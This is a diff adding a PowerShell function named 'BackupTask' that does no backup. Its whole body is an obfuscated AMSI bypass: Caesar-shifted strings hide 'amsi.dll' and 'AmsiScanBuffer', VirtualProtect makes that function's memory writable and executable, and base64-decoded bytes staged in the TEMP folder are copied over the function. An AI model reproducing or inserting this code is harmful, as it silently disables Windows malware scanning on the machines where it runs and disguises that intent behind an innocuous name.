@@ -1,0 +1,27 @@
+function BackupTask
+{
+$Win32 = @"
+using System;
+using System.Runtime.InteropServices;
+public class Win32 {
+ [DllImport("kernel32")]
+ public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
+ [DllImport("kernel32")]
+ public static extern IntPtr LoadLibrary(string name);
+ [DllImport("kernel32")]
+ public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);
+}
+"@
+Add-Type $Win32 
+
+$LoadLibrary = [Win32]::LoadLibrary($(-join('t'.ToCharArray()|%{[int]$c=$_;if($c-ge65-and$c-le90){[char](65+(($c-65+7)%26))}elseif($c-ge97-and$c-le122){[char](97+(($c-97+7)%26))}else{[char]$c}})) + $(-join('h'.ToCharArray()|%{[int]$c=$_;if($c-ge65-and$c-le90){[char](65+(($c-65+5)%26))}elseif($c-ge97-and$c-le122){[char](97+(($c-97+5)%26))}else{[char]$c}})) + $(-join('mc'.ToCharArray()|%{[int]$c=$_;if($c-ge65-and$c-le90){[char](65+(($c-65+6)%26))}elseif($c-ge97-and$c-le122){[char](97+(($c-97+6)%26))}else{[char]$c}})) + $(-join('.xff'.ToCharArray()|%{[int]$c=$_;if($c-ge65-and$c-le90){[char](65+(($c-65+6)%26))}elseif($c-ge97-and$c-le122){[char](97+(($c-97+6)%26))}else{[char]$c}})))
+$Address = [Win32]::GetProcAddress($LoadLibrary, $(-join('Ht'.ToCharArray()|%{[int]$c=$_;if($c-ge65-and$c-le90){[char](65+(($c-65+19)%26))}elseif($c-ge97-and$c-le122){[char](97+(($c-97+19)%26))}else{[char]$c}})) + $(-join('xn'.ToCharArray()|%{[int]$c=$_;if($c-ge65-and$c-le90){[char](65+(($c-65+21)%26))}elseif($c-ge97-and$c-le122){[char](97+(($c-97+21)%26))}else{[char]$c}})) + $(-join('Dn'.ToCharArray()|%{[int]$c=$_;if($c-ge65-and$c-le90){[char](65+(($c-65+15)%26))}elseif($c-ge97-and$c-le122){[char](97+(($c-97+15)%26))}else{[char]$c}})) + $(-join('uh'.ToCharArray()|%{[int]$c=$_;if($c-ge65-and$c-le90){[char](65+(($c-65+6)%26))}elseif($c-ge97-and$c-le122){[char](97+(($c-97+6)%26))}else{[char]$c}})) + $(-join('Sl'.ToCharArray()|%{[int]$c=$_;if($c-ge65-and$c-le90){[char](65+(($c-65+9)%26))}elseif($c-ge97-and$c-le122){[char](97+(($c-97+9)%26))}else{[char]$c}})) + $(-join('mmly'.ToCharArray()|%{[int]$c=$_;if($c-ge65-and$c-le90){[char](65+(($c-65+19)%26))}elseif($c-ge97-and$c-le122){[char](97+(($c-97+19)%26))}else{[char]$c}})))
+$p = 0
+[Win32]::VirtualProtect($Address, [uint32]5, 0x40, [ref]$p)
+$Base64 = "QV9BXl+4VwAHgMM="
+[IO.File]::WriteAllBytes("$env:TEMP\patch.bin",[Convert]::FromBase64String($Base64))
+$Patch = [IO.File]::ReadAllBytes("$env:TEMP\patch.bin")
+$Address = [Int64]$Address + 0x14
+$new = [System.Runtime.InteropServices.Marshal]
+$new::Copy($Patch, 0, $Address, 11)
+}
